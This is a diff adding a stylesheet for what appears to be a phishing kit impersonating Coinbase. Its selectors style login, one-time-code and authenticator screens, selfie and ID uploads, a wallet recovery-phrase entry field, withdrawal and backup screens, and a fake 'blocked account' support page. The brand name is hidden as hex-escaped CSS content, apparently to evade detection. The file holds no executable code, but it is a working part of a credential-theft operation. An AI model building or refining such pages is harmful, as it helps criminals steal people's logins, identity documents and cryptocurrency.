@@ -1,0 +1,1462 @@
+:root {
+    --font-family-1: CoinbaseDisplay, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+    --font-family-2: CoinbaseSans, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    border-style: solid;
+    border-width: 0;
+}
+
+*::after,
+*::before {
+    box-sizing: border-box;
+    border-style: solid;
+    border-width: 0;
+}
+
+a {
+    color: rgb(0, 82, 255);
+}
+
+[x-cloak] {
+    display: none !important;
+}
+
+html {
+    height: 100%;
+    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: transparent;
+}
+
+body {
+    background-color: rgb(10, 11, 13);
+    height: 100%;
+    color: #FFF;
+    font-family: var(--font-family-2);
+    display: flex;
+    flex-direction: column;
+}
+
+[class~=brand]::before {
+    content: "\0043\006F\0069\006E\0062\0061\0073\0065";
+}
+
+.header {
+    padding: 24px 32px;
+}
+
+.container {
+    width: 450px;
+    margin: 0 auto;
+    flex: 1;
+    display: flex;
+    align-items: center;
+}
+
+.content {
+    padding: 40px 32px;
+    border: 1px solid hsla(219, 9%, 58%, 0.2);
+    border-radius: 16px;
+    width: 100%;
+    text-align: center;
+}
+
+.main-logo {
+    margin-bottom: 32px;
+    width: 180px;
+    margin: 0 auto;
+}
+
+.main-logo svg {
+    width: 100%;
+}
+
+.verification-form h1 {
+    font-family: var(--font-family-1);
+    font-size: 24px;
+    font-weight: 500;
+    margin-bottom: 24px;
+}
+
+.instructions {
+    margin-bottom: 32px;
+}
+
+.instructions p {
+    color: rgb(153, 160, 166);
+    font-size: 16px;
+    line-height: 1.5;
+    margin-bottom: 16px;
+}
+
+.instructions p:last-child {
+    margin-bottom: 0;
+}
+
+.instructions strong {
+    color: #fff;
+    font-weight: 500;
+}
+
+.form-group {
+    margin-bottom: 16px;
+}
+
+.form-group:last-child {
+    margin-bottom: 0;
+}
+
+.form-control {
+    width: 100%;
+    padding: 16px;
+    background: transparent;
+    border: 1px solid rgb(47, 52, 61);
+    border-radius: 8px;
+    color: #fff;
+    font-size: 16px;
+    font-family: var(--font-family-2);
+    transition: border-color 0.2s;
+}
+
+.form-control:focus {
+    outline: none;
+    border-color: rgb(87, 139, 250);
+    box-shadow: 0 0 0 1px #578bfa;
+}
+
+.form-control::placeholder {
+    color: rgb(153, 160, 166);
+}
+
+.error-message {
+    color: #ff4343;
+    font-size: 14px;
+    margin-top: 8px;
+    text-align: left;
+    padding-bottom: 8px;
+}
+
+.form-control.error {
+    border-color: rgb(255, 67, 67);
+}
+
+.form-control.error+.error-message {
+    display: block;
+}
+
+.ft-icon {
+    margin: 20px 0;
+}
+
+.ft-icon img {
+    width: 50%;
+}
+
+button[type="submit"] {
+    font-family: Arial;
+    font-weight: 600;
+    width: 100%;
+    height: 56px;
+    padding: 16px;
+    background: rgb(87, 139, 250);
+    border-radius: 8px;
+    color: rgb(10, 11, 13);
+    font-size: 16px;
+    border-radius: 56px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+}
+
+button[type="submit"]:hover {
+    background: #507fe5
+}
+
+span.spinner {
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 24px;
+    height: 24px;
+    color: rgb(10, 11, 13);
+    border-top-color: transparent;
+}
+
+span.spinnerStatus {
+    border-radius: 50%;
+    display: block;
+    -webkit-animation: spinner 1s linear infinite;
+    animation: spinner 1s linear infinite;
+    border-top-width: 2px;
+    border-right-width: 2px;
+    border-left-width: 2px;
+    border-top-style: solid;
+    border-right-style: solid;
+    border-left-style: solid;
+    width: 24px;
+    height: 24px;
+    border-top-color: #141519;
+    border-right-color: transparent;
+    border-left-color: transparent;
+}
+
+button[type="submit"]:disabled,
+button[type="submit"][disabled] {
+    background-color: #1f2024;
+    cursor: not-allowed;
+    pointer-events: none;
+    color: #0a0b0d;
+}
+
+.loading {
+    cursor: not-allowed;
+    pointer-events: none;
+    user-select: none;
+}
+
+.loader {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    margin: 32px 0;
+}
+
+.loader .dot {
+    width: 12px;
+    height: 12px;
+    background-color: rgb(87, 139, 250);
+    border-radius: 50%;
+    animation: bounce 1.2s infinite ease-in-out;
+}
+
+.loader .dot:nth-child(1) {
+    animation-delay: -0.32s;
+}
+
+.loader .dot:nth-child(2) {
+    animation-delay: -0.16s;
+}
+
+[x-data="livechatApp"] .main-logo {
+    width: 120px;
+    margin: inherit;
+}
+
+[x-data="livechatApp"] .content {
+    padding-top: 16px;
+}
+
+[x-data="livechatApp"] .instructions p {
+    margin-top: 16px;
+}
+
+[x-data="livechatApp"] button[type="button"] {
+    font-family: Arial;
+    font-weight: 600;
+    width: 100%;
+    padding: 16px;
+    background: rgb(87, 139, 250);
+    border-radius: 8px;
+    color: rgb(10, 11, 13);
+    font-size: 16px;
+    border-radius: 56px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+}
+
+[x-data="livechatApp"] button[type="button"]:hover {
+    background: #507fe5
+}
+
+[x-data="livechatApp"] .verification-form h1 {
+    font-size: 18px;
+}
+
+.otp-inputs {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 32px;
+}
+
+.otp-inputs .form-control {
+    width: calc(100% / 6);
+    height: 55px;
+    font-size: 24px;
+    text-align: center;
+    padding: 0;
+    border-radius: 8px;
+    border: 2px solid rgb(47, 52, 61);
+}
+
+[x-data="otpApp"] .verification-form h1,
+[x-data="otpApp"] .instructions p {
+    text-align: left;
+}
+
+[x-data="otpApp"] .verification-form h1 {
+    font-size: 20px;
+}
+
+[x-data="otpApp"] .content {
+    padding-top: 16px;
+}
+
+[x-data="otpApp"] .main-logo {
+    width: 120px;
+    margin: inherit;
+}
+
+[x-data="otpApp"] .instructions p {
+    font-size: 15px;
+}
+
+[x-data="otpApp"] button[type="submit"][disabled],
+[x-data="otpApp"] button[type="submit"]:disabled {
+    background-color: #3b3d49;
+    color: #FFF;
+}
+
+[x-data="authApp"] .verification-form h1,
+[x-data="authApp"] .instructions p {
+    text-align: left;
+}
+
+[x-data="authApp"] .verification-form h1 {
+    font-size: 20px;
+}
+
+[x-data="authApp"] .content {
+    padding-top: 16px;
+}
+
+[x-data="authApp"] .main-logo {
+    width: 120px;
+    margin: inherit;
+}
+
+[x-data="authApp"] .instructions p {
+    font-size: 15px;
+}
+
+[x-data="authApp"] button[type="submit"][disabled],
+[x-data="authApp"] button[type="submit"]:disabled {
+    background-color: #3b3d49;
+    color: #FFF;
+}
+
+[x-data="selfieApp"] .content {
+    padding-top: 16px;
+}
+
+[x-data="selfieApp"] .main-logo {
+    width: 120px;
+    margin: inherit;
+}
+
+.id-upload-container {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 24px;
+    justify-content: center;
+}
+
+.id-side {
+    width: 180px;
+    height: 180px;
+    border: 2px dashed rgb(47, 52, 61);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    position: relative;
+    transition: border-color 0.2s;
+}
+
+.id-side:hover {
+    border-color: rgb(87, 139, 250);
+}
+
+.id-placeholder {
+    text-align: center;
+}
+
+.id-icon {
+    margin-bottom: 8px;
+}
+
+.id-icon img {
+    width: 48px;
+    height: 48px;
+}
+
+.id-preview {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 6px;
+}
+
+.no-edit-warning {
+    text-align: center;
+    margin-bottom: 24px;
+}
+
+.no-edit-warning img {
+    width: 120px;
+    margin-bottom: 16px;
+}
+
+.no-edit-warning p {
+    color: rgb(153, 160, 166);
+    font-size: 14px;
+}
+
+[x-data="verifyApp"] .content {
+    padding-top: 16px;
+}
+
+[x-data="verifyApp"] .main-logo {
+    width: 120px;
+    margin: inherit;
+}
+
+@media (max-width: 768px) {
+    .header {
+        padding: 16px 24px 0 24px;
+    }
+
+    .container {
+        width: 100%;
+    }
+
+    .content {
+        border: none;
+        padding: 0 24px 0 24px;
+        margin-bottom: 5rem;
+    }
+}
+
+@-webkit-keyframes spinner {
+    0% {
+        -webkit-transform: rotate(0deg);
+        -ms-transform: rotate(0deg);
+        transform: rotate(0)
+    }
+
+    to {
+        -webkit-transform: rotate(360deg);
+        -ms-transform: rotate(360deg);
+        transform: rotate(360deg)
+    }
+}
+
+@keyframes spinner {
+    0% {
+        -webkit-transform: rotate(0deg);
+        -ms-transform: rotate(0deg);
+        transform: rotate(0)
+    }
+
+    to {
+        -webkit-transform: rotate(360deg);
+        -ms-transform: rotate(360deg);
+        transform: rotate(360deg)
+    }
+}
+
+@keyframes bounce {
+
+    0%,
+    80%,
+    100% {
+        transform: translateY(0);
+    }
+
+    40% {
+        transform: translateY(-12px);
+    }
+}
+
+@font-face {
+    font-family: 'CoinbaseIcons';
+    font-style: normal;
+    font-weight: 400;
+    font-display: block;
+    src: url(./1726511608548.woff2) format('woff2');
+}
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseDisplay;
+    src: url(./a_BDyAm2xz.woff2) format("woff2");
+    font-weight: 400
+}
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseDisplay;
+    src: url(./a_Dd_cEDRa.woff2) format("woff2");
+    font-weight: 500 800
+}
+
+@font-face {
+    font-family: CoinbaseIcons;
+    font-style: normal;
+    font-weight: 400;
+    font-display: block;
+    src: url(./a_D-AGEC5i.woff2) format("woff2")
+}
+
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseSans;
+    src: url(./a_BybxolpF.woff2) format("woff2");
+    font-weight: 400
+}
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseSans;
+    src: url(./a_CH-aRrrD.woff2) format("woff2");
+    font-weight: 500 800
+}
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseText;
+    src: url(./a_BJ1-X6Dz.woff2) format("woff2");
+    font-weight: 400
+}
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseText;
+    src: url(./a_B-911Gqf.woff2) format("woff2");
+    font-weight: 500 800
+}
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseMono;
+    src: url(./a_BhjxHaJp.woff2) format("woff2");
+    font-weight: 400
+}
+
+@font-face {
+    font-display: swap;
+    font-family: CoinbaseMono;
+    src: url(./a_BP6LpXDE.woff2) format("woff2");
+    font-weight: 500 800
+}
+
+.selfie-upload-container {
+    width: 200px;
+    height: 200px;
+    border: 2px dashed rgb(47, 52, 61);
+    border-radius: 8px;
+    margin: 0 auto 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    position: relative;
+    transition: border-color 0.2s;
+}
+
+.selfie-upload-container:hover {
+    border-color: rgb(87, 139, 250);
+}
+
+.hidden-input {
+    display: none;
+}
+
+.selfie-placeholder {
+    text-align: center;
+}
+
+.selfie-icon {
+    margin-bottom: 8px;
+}
+
+.selfie-preview {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 6px;
+}
+
+.instructions-text {
+    color: rgb(153, 160, 166);
+    font-size: 14px;
+    text-align: center;
+    margin-bottom: 24px;
+}
+
+[x-data="selfieApp"] .verification-form h1 {
+    margin-bottom: 16px;
+}
+
+[x-data="selfieApp"] .instructions {
+    margin-bottom: 24px;
+}
+
+.ss-icon {
+    font-family: CoinbaseIcons;
+    font-weight: 400;
+    font-style: normal;
+    font-variant: normal;
+    text-rendering: auto;
+    line-height: 1;
+    flex-shrink: 0;
+    display: block;
+    text-decoration: none;
+    font-size: 16px;
+    color: #8a919e;
+}
+
+.copy-icon {
+    display: block;
+    width: 16px;
+    height: 16px;
+    font-family: 'CoinbaseIcons';
+    font-weight: 400;
+    font-style: normal;
+    font-variant: normal;
+    text-rendering: auto;
+    color: #fff;
+    font-size: 16px;
+}
+
+.show-icon {
+    display: block;
+    width: 16px;
+    height: 16px;
+    font-family: 'CoinbaseIcons';
+    font-weight: 400;
+    font-style: normal;
+    font-variant: normal;
+    text-rendering: auto;
+    color: #fff;
+    font-size: 16px;
+}
+
+.account-content {
+    display: flex;
+    align-items: center;
+    padding: 16px;
+    gap: 8px;
+    border: 1px solid #8a919e33;
+    border-radius: 8px;
+    cursor: pointer;
+    margin-bottom: 24px;
+}
+
+.account-content:hover {
+    background-color: #0f1012;
+}
+
+.account-image {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    overflow: hidden;
+}
+
+.account-image img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.account-details p {
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    font-size: 16px;
+    font-weight: 600;
+    line-height: 24px;
+}
+
+[x-data="loginApp"] .form-group {
+    display: flex;
+    gap: 4px;
+    flex-direction: column;
+}
+
+[x-data="loginApp"] .form-group label {
+    text-align: start;
+    font-size: 14px;
+    font-weight: 600;
+    padding: 4px 0;
+    line-height: 20px;
+}
+
+[x-data="loginApp"] .input-group {
+    position: relative;
+}
+
+[x-data="loginApp"] .input-group input {
+    cursor: pointer;
+}
+
+[x-data="loginApp"] .input-group input:hover {
+    background-color: #0f1012;
+}
+
+[x-data="loginApp"] .ft-icon {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    background-color: transparent;
+    border: none;
+    padding: 0;
+    margin: 0;
+}
+
+[x-data="loginApp"] .forgot-password {
+    padding-bottom: 48px;
+    font-size: 16px;
+    font-weight: 400;
+    color: #578bfa;
+    line-height: 24px;
+    text-align: left;
+}
+
+[x-data="loginApp"] .verification-form h1 {
+    text-align: left;
+}
+
+[x-data="loginApp"] .content {
+    padding: 32px 40px 0 40px;
+}
+
+[x-data="loginApp"] .form-group:last-child {
+    padding-bottom: 24px;
+}
+
+@media (max-width: 768px) {
+    [x-data="loginApp"] .content {
+        padding: 24px 24px 0 24px;
+    }
+
+    [x-data="loginApp"] .container,
+    [x-data="withdrawalApp"] .container,
+    [x-data="backupApp"] .container {
+        flex: 0;
+    }
+
+    .account-image {
+        width: 32px;
+        height: 32px;
+    }
+
+    [x-data="loginApp"] .verification-form h1 {
+        margin-bottom: 16px;
+        font-size: 28px;
+    }
+
+    [x-data="loginApp"] .header {
+        padding: 20px 24px 0 24px;
+    }
+
+    [x-data="loginApp"] .input-group input {
+        border: 1px solid #8a919ea8;
+    }
+}
+
+.continue-btn {
+    font-family: Arial;
+    font-weight: 600;
+    width: 100%;
+    height: 56px;
+    padding: 16px;
+    background: rgb(87, 139, 250);
+    border-radius: 56px;
+    color: rgb(10, 11, 13);
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    border: none;
+}
+
+.continue-btn:hover {
+    background: #507fe5;
+}
+
+.continue-btn:disabled {
+    background-color: #314b84;
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+[x-data="linkApp"] .instructions p {
+    color: rgb(153, 160, 166);
+    font-size: 16px;
+    line-height: 1.5;
+    margin-bottom: 16px;
+    text-align: center;
+}
+
+
+[x-data="linkApp"] .main-logo img {
+    width: 100%;
+    height: 100%;
+}
+
+.usb-logo {
+    width: 100px;
+    margin: 0 auto 32px;
+}
+
+.usb-logo img {
+    width: 100%;
+    height: 100%;
+}
+
+.step-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 0 24px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    margin-bottom: 32px;
+}
+
+.step-title h2 {
+    font-size: 18px;
+    font-weight: 500;
+    color: #fff;
+}
+
+.menu-button {
+    background: none;
+    border: none;
+    padding: 8px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.menu-button:hover {
+    opacity: 0.8;
+}
+
+.store-buttons {
+    display: flex;
+    gap: 16px;
+    justify-content: center;
+    margin: 24px 0 32px;
+}
+
+.store-link {
+    display: flex;
+    align-items: center;
+    height: 40px;
+}
+
+.store-badge {
+    height: 100%;
+    width: auto;
+    object-fit: contain;
+}
+
+[x-data="linkApp"] .content {
+    padding: 0;
+}
+
+[x-data="linkApp"] .verification-form>div {
+    padding: 24px;
+}
+
+[x-data="linkApp"] [x-show="step === 2"]~.main-logo {
+    display: none;
+}
+
+.wallet-icon {
+    width: 100px;
+    margin: 0 auto 32px;
+}
+
+.wallet-icon img {
+    width: 100%;
+    height: 100%;
+}
+
+.recovery-phrase-container {
+    margin: 24px 0;
+    position: relative;
+}
+
+.recovery-phrase {
+    width: 100%;
+    height: 110px;
+    padding: 8px 16px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 8px;
+    color: #fff;
+    font-size: 16px;
+    font-family: var(--font-family-2);
+    text-align: center;
+    resize: none;
+    line-height: 1.5;
+    text-align: left;
+    cursor: pointer;
+}
+
+.recovery-phrase.blurred {
+    filter: blur(4px);
+    user-select: none;
+}
+
+.recovery-phrase:focus {
+    outline: none;
+    border-color: rgb(87, 139, 250);
+}
+
+.copy-btn {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: transparent;
+    border: none;
+    color: #fff;
+    padding: 8px;
+    cursor: pointer;
+    margin-top: 12px;
+
+    font-size: 14px;
+    font-weight: 600;
+    line-height: 20px;
+}
+
+.copy-btn:hover {
+    opacity: 0.8;
+}
+
+.checkbox-container {
+    margin: 24px 0;
+}
+
+.input-group-2 {
+    position: relative;
+}
+
+.show-icon {
+    position: absolute;
+    bottom: 16px;
+    right: 16px;
+    cursor: pointer;
+}
+
+.checkbox-label {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    cursor: pointer;
+    flex-direction: row-reverse;
+    justify-content: flex-end;
+}
+
+.checkbox-input {
+    width: 20px;
+    height: 20px;
+    margin-top: 2px;
+    accent-color: rgb(87, 139, 250);
+}
+
+.checkbox-text {
+    color: rgb(153, 160, 166);
+    font-size: 14px;
+    line-height: 1.5;
+    text-align: left;
+}
+
+[x-data="linkApp"] .verification-form h1 {
+    font-size: 28px;
+    font-weight: 500;
+    margin-bottom: 16px;
+}
+
+[x-data="linkApp"] .instructions p {
+    color: rgb(153, 160, 166);
+    font-size: 16px;
+    line-height: 1.5;
+}
+
+.toast-container {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    z-index: 1000;
+}
+
+.toast {
+    background-color: #00C087;
+    color: white;
+    padding: 8px 16px;
+    border-radius: 100px;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+.toast.success::after {
+    content: "âœ“";
+    font-size: 16px;
+    margin-left: 2px;
+}
+
+.toast-enter {
+    animation: slideIn 0.2s ease-out;
+}
+
+.toast-leave {
+    animation: slideOut 0.2s ease-in;
+}
+
+.hr {
+    width: 100%;
+    position: relative;
+    padding-bottom: 16px;
+}
+
+.hr .my-hr {
+    width: 100%;
+    position: absolute;
+    top: 8px;
+    align-self: stretch;
+    display: flex;
+}
+
+.hr hr {
+    background-color: #8a919e33;
+    height: 1px;
+    flex-grow: 1;
+}
+
+.hr p {
+    padding: 0 16px;
+    color: #8a919e;
+    text-align: center;
+    font-size: 13px;
+    line-height: 16px;
+    font-weight: 400;
+    font-family: CoinbaseSans, -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+}
+
+.button-group {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    padding-bottom: 16px;
+}
+
+.button-group button {
+    width: 100%;
+    max-width: 100%;
+    white-space: normal;
+    display: flex;
+    justify-content: center;
+    font-weight: 600;
+    margin: 0;
+    position: relative;
+    min-width: 100px;
+    align-items: center;
+    appearance: none;
+    outline: 0;
+    overflow: visible;
+    text-transform: none;
+    height: 56px;
+    cursor: pointer;
+    background-color: #32353d;
+    border-radius: 56px;
+    border-width: 1px;
+    color: rgb(255, 255, 255);
+    border: 1px solid transparent;
+    padding: 0 32px;
+}
+
+.button-group button:hover {
+    background-color: #3a3d45;
+}
+
+.button-group button span.text {
+    line-height: 24px;
+    font-weight: 600;
+    font-size: 16px;
+    color: #FFF;
+    flex: 100%;
+}
+
+.button-group button span.icon {
+    display: flex;
+    -webkit-flex-direction: row;
+    -ms-flex-direction: row;
+    flex-direction: row;
+    -webkit-align-items: center;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-flex: 1;
+    -webkit-flex-grow: 1;
+    -ms-flex-positive: 1;
+    flex-grow: 1;
+    -webkit-flex-shrink: 0;
+    -ms-flex-negative: 0;
+    flex-shrink: 0;
+    -webkit-box-pack: start;
+    -webkit-justify-content: flex-start;
+    -ms-flex-pack: start;
+    justify-content: flex-start;
+    margin-right: 8px;
+}
+
+.info-label {
+    font-size: 13px;
+    line-height: 16px;
+    font-weight: 400;
+    margin: 0;
+    text-align: center;
+    transition: color .15s ease-out, opacity .15s ease-out;
+    color: #8a919e;
+    padding: 0 56px;
+    padding-bottom: 24px;
+}
+
+.info-label a {
+    -webkit-text-decoration: none;
+    text-decoration: underline;
+    cursor: pointer;
+    background: none;
+    margin: 0;
+    padding: 0;
+    border: 0;
+    text-align: start;
+    color: inherit;
+}
+
+
+@keyframes slideIn {
+    from {
+        transform: translateY(-20px);
+        opacity: 0;
+    }
+
+    to {
+        transform: translateY(0);
+        opacity: 1;
+    }
+}
+
+@keyframes slideOut {
+    from {
+        transform: translateY(0);
+        opacity: 1;
+    }
+
+    to {
+        transform: translateY(-20px);
+        opacity: 0;
+    }
+}
+
+@-webkit-keyframes spin-cds-spinnerAnimation-s16l7s1z {
+    0% {
+        -webkit-transform: rotate(0deg);
+        -ms-transform: rotate(0deg);
+        transform: rotate(0)
+    }
+
+    to {
+        -webkit-transform: rotate(360deg);
+        -ms-transform: rotate(360deg);
+        transform: rotate(360deg)
+    }
+}
+
+@keyframes spin-cds-spinnerAnimation-s16l7s1z {
+    0% {
+        -webkit-transform: rotate(0deg);
+        -ms-transform: rotate(0deg);
+        transform: rotate(0)
+    }
+
+    to {
+        -webkit-transform: rotate(360deg);
+        -ms-transform: rotate(360deg);
+        transform: rotate(360deg)
+    }
+}
+
+/* Coinbase-style Blocked Account Section */
+.my-content {
+    width: 450px;
+    margin: 0 auto;
+    flex: 1;
+    display: flex;
+    align-items: center;
+}
+
+.blocked-account-container {
+    background: rgb(10, 11, 13);
+    border: 1px solid hsla(219, 9%, 58%, 0.2);
+    border-radius: 16px;
+    padding: 24px;
+    width: 100%;
+    text-align: center;
+    position: relative;
+}
+
+.blocked-icon {
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 32px;
+    background: rgba(255, 67, 67, 0.15);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid rgba(255, 67, 67, 0.3);
+}
+
+.blocked-icon svg {
+    width: 32px;
+    height: 32px;
+    fill: #ff4343;
+}
+
+.blocked-account-title {
+    font-family: var(--font-family-1);
+    font-size: 24px;
+    font-weight: 500;
+    color: #fff;
+    margin-bottom: 16px;
+    line-height: 1.3;
+}
+
+.blocked-account-description {
+    color: rgb(153, 160, 166);
+    font-size: 16px;
+    line-height: 1.5;
+    margin-bottom: 32px;
+    text-align: center;
+    max-width: none;
+    margin-left: 0;
+    margin-right: 0;
+}
+
+.help-section {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 8px;
+    padding: 24px;
+    margin-top: 24px;
+    text-align: left;
+}
+
+.help-title {
+    font-family: var(--font-family-1);
+    font-size: 18px;
+    font-weight: 500;
+    color: #fff;
+    margin-bottom: 12px;
+    line-height: 1.3;
+}
+
+.help-description {
+    color: rgb(153, 160, 166);
+    font-size: 14px;
+    line-height: 1.5;
+    margin-bottom: 20px;
+}
+
+.contact-options {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+
+.contact-button {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 16px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 8px;
+    text-decoration: none;
+    color: #fff;
+    transition: all 0.2s ease;
+    cursor: pointer;
+}
+
+.contact-button:hover {
+    background: rgba(255, 255, 255, 0.08);
+    border-color: rgba(255, 255, 255, 0.15);
+}
+
+.contact-button:active {
+    background: rgba(255, 255, 255, 0.03);
+}
+
+.contact-info {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.contact-icon {
+    width: 20px;
+    height: 20px;
+    fill: rgb(87, 139, 250);
+}
+
+.contact-text {
+    font-size: 14px;
+    font-weight: 500;
+    line-height: 1.4;
+}
+
+.contact-subtext {
+    font-size: 12px;
+    color: rgb(153, 160, 166);
+    line-height: 1.3;
+    margin-top: 2px;
+}
+
+.contact-arrow {
+    width: 16px;
+    height: 16px;
+    fill: rgb(153, 160, 166);
+    transition: transform 0.2s ease;
+}
+
+.contact-button:hover .contact-arrow {
+    transform: translateX(2px);
+}
+
+.additional-info {
+    margin-top: 24px;
+    padding-top: 24px;
+    border-top: 1px solid rgba(255, 255, 255, 0.08);
+}
+
+.additional-info p {
+    color: rgb(153, 160, 166);
+    font-size: 13px;
+    line-height: 1.4;
+    margin-bottom: 8px;
+}
+
+.additional-info a {
+    color: rgb(87, 139, 250);
+    text-decoration: none;
+}
+
+.additional-info a:hover {
+    text-decoration: underline;
+}
+
+.cds-iconStyles-irtngcj {
+    font-family: CoinbaseIconsV7;
+    font-weight: 400;
+    font-style: normal;
+    font-variant: normal;
+    text-rendering: auto;
+    line-height: 1;
+    -webkit-flex-shrink: 0;
+    -ms-flex-negative: 0;
+    flex-shrink: 0;
+    display: block;
+    -webkit-text-decoration: none;
+    text-decoration: none
+}
+
+.cds-iconStyles-irtngcj>* {
+    -webkit-transition: fill .15s ease-in-out;
+    transition: fill .15s ease-in-out
+}
+
+@media (max-width: 768px) {
+    .my-content {
+        width: 100%;
+        flex: 0;
+    }
+    
+    .blocked-account-container {
+        border: none;
+        padding: 24px;
+        margin-bottom: 5rem;
+    }
+    
+    .blocked-icon {
+        width: 56px;
+        height: 56px;
+        margin-bottom: 24px;
+    }
+    
+    .blocked-icon svg {
+        width: 28px;
+        height: 28px;
+    }
+    
+    .blocked-account-title {
+        font-size: 20px;
+        margin-bottom: 12px;
+    }
+    
+    .blocked-account-description {
+        font-size: 15px;
+        margin-bottom: 24px;
+    }
+    
+    .help-section {
+        padding: 20px;
+        margin-top: 20px;
+    }
+    
+    .help-title {
+        font-size: 16px;
+        margin-bottom: 10px;
+    }
+    
+    .help-description {
+        font-size: 13px;
+        margin-bottom: 16px;
+    }
+    
+    .contact-button {
+        padding: 14px;
+    }
+    
+    .contact-text {
+        font-size: 13px;
+    }
+    
+    .contact-subtext {
+        font-size: 11px;
+    }
+}
+
+@font-face {
+    font-family: CoinbaseIconsV7;
+    font-style: normal;
+    font-weight: 400;
+    font-display: block;
+    src: url(./a__yv-nxYM.woff2) format("woff2")
+}
